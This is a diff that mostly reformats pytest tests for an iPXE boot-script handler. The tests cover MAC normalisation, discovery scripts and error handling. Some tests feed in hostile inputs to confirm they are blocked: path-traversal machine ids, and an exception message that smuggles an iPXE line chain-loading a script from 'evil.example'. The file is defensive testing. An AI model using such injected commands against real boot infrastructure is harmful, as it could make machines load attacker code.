@@ -3,7 +3,6 @@
 import httpx
 import pytest
 import respx
-
 from worker.config import WorkerConfig
 from worker.enrollment import EnrollmentManager
 from worker.services.ipxe_handler import IPXEHandler
@@ -36,7 +35,14 @@ async def test_known_machine_returns_api_script_with_auth_headers() -> None:
     handler = _handler()
     with respx.mock(assert_all_called=True) as router:
         route = router.get(MAC_URL).mock(
-            return_value=httpx.Response(200, json={"script": "#!ipxe\nboot disk\n", "machine_id": "m1", "status": "ready"})
+            return_value=httpx.Response(
+                200,
+                json={
+                    "script": "#!ipxe\nboot disk\n",
+                    "machine_id": "m1",
+                    "status": "ready",
+                },
+            )
         )
         script = await handler.generate_script("aa:bb:cc:dd:ee:ff")
 
@@ -47,12 +53,16 @@ async def test_known_machine_returns_api_script_with_auth_headers() -> None:
 
 
 @pytest.mark.asyncio
-@pytest.mark.parametrize("raw", ["AA-BB-CC-DD-EE-FF", "aa:bb:cc:dd:ee:ff", "AABBCCDDEEFF", "aAbBcCdDeEfF"])
+@pytest.mark.parametrize(
+    "raw", ["AA-BB-CC-DD-EE-FF", "aa:bb:cc:dd:ee:ff", "AABBCCDDEEFF", "aAbBcCdDeEfF"]
+)
 async def test_mac_forms_are_normalised_to_bare_lowercase(raw: str) -> None:
     """Colon, dash and upper-case MAC spellings all resolve to the same bare lowercase API path."""
     handler = _handler()
     with respx.mock(assert_all_called=True) as router:
-        route = router.get(MAC_URL).mock(return_value=httpx.Response(200, json={"script": "S"}))
+        route = router.get(MAC_URL).mock(
+            return_value=httpx.Response(200, json={"script": "S"})
+        )
         script = await handler.generate_script(raw)
 
     assert script == "S"
@@ -70,8 +80,13 @@ async def test_unknown_machine_gets_discovery_script() -> None:
     assert script.startswith("#!ipxe\n")
     assert "# Discovery script for new machine: aabbccddeeff" in script
     assert "echo MAC Address: aabbccddeeff" in script
-    assert "chain " not in script.split("Boot discovery image")[0]  # no GET chain to the POST-only /boot-event
-    assert f"kernel {BOOT_URL}/images/discovery/vmlinuz initrd=initrd ip=dhcp gough.boot_token=${{boot_token}}" in script
+    assert (
+        "chain " not in script.split("Boot discovery image")[0]
+    )  # no GET chain to the POST-only /boot-event
+    assert (
+        f"kernel {BOOT_URL}/images/discovery/vmlinuz initrd=initrd ip=dhcp gough.boot_token=${{boot_token}}"
+        in script
+    )
     assert f"initrd {BOOT_URL}/images/discovery/initrd" in script
     assert script.rstrip().endswith("shell")
 
@@ -81,7 +96,9 @@ async def test_server_error_yields_error_script_without_leaking_body() -> None:
     """A 500 from api-manager becomes the generic 'API request failed' error script."""
     handler = _handler()
     with respx.mock:
-        respx.get(MAC_URL).mock(return_value=httpx.Response(500, text="stack trace here"))
+        respx.get(MAC_URL).mock(
+            return_value=httpx.Response(500, text="stack trace here")
+        )
         script = await handler.generate_script("aa:bb:cc:dd:ee:ff")
 
     assert "echo API request failed" in script
@@ -116,24 +133,37 @@ async def test_error_message_newlines_cannot_inject_ipxe_commands() -> None:
     """A newline in an exception message must not create a new iPXE line (command injection)."""
     handler = _handler()
     with respx.mock:
-        respx.get(MAC_URL).mock(side_effect=httpx.ReadTimeout("oops\nchain http://evil.example/x.ipxe"))
+        respx.get(MAC_URL).mock(
+            side_effect=httpx.ReadTimeout("oops\nchain http://evil.example/x.ipxe")
+        )
         script = await handler.generate_script("aa:bb:cc:dd:ee:ff")
 
     lines = script.splitlines()
     assert not any(line.startswith("chain") for line in lines)
-    assert any(line.startswith("echo oops chain http://evil.example/x.ipxe") for line in lines)
+    assert any(
+        line.startswith("echo oops chain http://evil.example/x.ipxe") for line in lines
+    )
 
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize(
     "bad_mac",
-    ["../../admin", "aa:bb:cc:dd:ee", "aa:bb:cc:dd:ee:ff:00", "zz:bb:cc:dd:ee:ff", "", "aa/bb/cc/dd/ee/ff"],
+    [
+        "../../admin",
+        "aa:bb:cc:dd:ee",
+        "aa:bb:cc:dd:ee:ff:00",
+        "zz:bb:cc:dd:ee:ff",
+        "",
+        "aa/bb/cc/dd/ee/ff",
+    ],
 )
 async def test_malformed_mac_is_rejected_before_any_api_call(bad_mac: str) -> None:
     """Non-MAC input never reaches the API URL or the script; the error script is returned instead."""
     handler = _handler()
     with respx.mock(assert_all_called=False) as router:
-        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, json={"script": "X"}))
+        route = router.get(url__regex=r".*").mock(
+            return_value=httpx.Response(200, json={"script": "X"})
+        )
         script = await handler.generate_script(bad_mac)
 
     assert route.call_count == 0
@@ -167,7 +197,9 @@ async def test_cloud_init_metadata_success_returns_body() -> None:
     handler = _handler()
     url = f"{API}/api/v1/internal/cloud-init/m-42/meta-data"
     with respx.mock(assert_all_called=True) as router:
-        route = router.get(url).mock(return_value=httpx.Response(200, text="instance-id: m-42\n"))
+        route = router.get(url).mock(
+            return_value=httpx.Response(200, text="instance-id: m-42\n")
+        )
         body = await handler.get_cloud_init_metadata("m-42")
 
     assert body == "instance-id: m-42\n"
@@ -193,7 +225,9 @@ async def test_cloud_init_metadata_rejects_traversal_machine_id() -> None:
     """A machine id containing path separators never reaches the API path."""
     handler = _handler()
     with respx.mock(assert_all_called=False) as router:
-        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, text="pwned"))
+        route = router.get(url__regex=r".*").mock(
+            return_value=httpx.Response(200, text="pwned")
+        )
         body = await handler.get_cloud_init_metadata("../../internal/secret")
 
     assert route.call_count == 0
@@ -206,7 +240,9 @@ async def test_cloud_init_userdata_success_returns_body() -> None:
     handler = _handler()
     url = f"{API}/api/v1/internal/cloud-init/m-9/user-data"
     with respx.mock(assert_all_called=True) as router:
-        route = router.get(url).mock(return_value=httpx.Response(200, text="#cloud-config\nhostname: m-9\n"))
+        route = router.get(url).mock(
+            return_value=httpx.Response(200, text="#cloud-config\nhostname: m-9\n")
+        )
         body = await handler.get_cloud_init_userdata("m-9")
 
     assert body == "#cloud-config\nhostname: m-9\n"
@@ -232,7 +268,9 @@ async def test_cloud_init_userdata_rejects_invalid_machine_id() -> None:
     """Machine ids with dots or slashes are refused without an API call."""
     handler = _handler()
     with respx.mock(assert_all_called=False) as router:
-        route = router.get(url__regex=r".*").mock(return_value=httpx.Response(200, text="x"))
+        route = router.get(url__regex=r".*").mock(
+            return_value=httpx.Response(200, text="x")
+        )
         body = await handler.get_cloud_init_userdata("m.9/../x")
 
     assert route.call_count == 0
@@ -240,7 +278,9 @@ async def test_cloud_init_userdata_rejects_invalid_machine_id() -> None:
 
 
 @pytest.mark.asyncio
-async def test_token_minting_without_client_address_yields_error_script(token_store: object) -> None:
+async def test_token_minting_without_client_address_yields_error_script(
+    token_store: object,
+) -> None:
     """With a token store but no client address, no token is minted and an error script is served."""
     handler = IPXEHandler(_handler().config, _handler().enrollment, token_store)  # type: ignore[arg-type]
     with respx.mock:
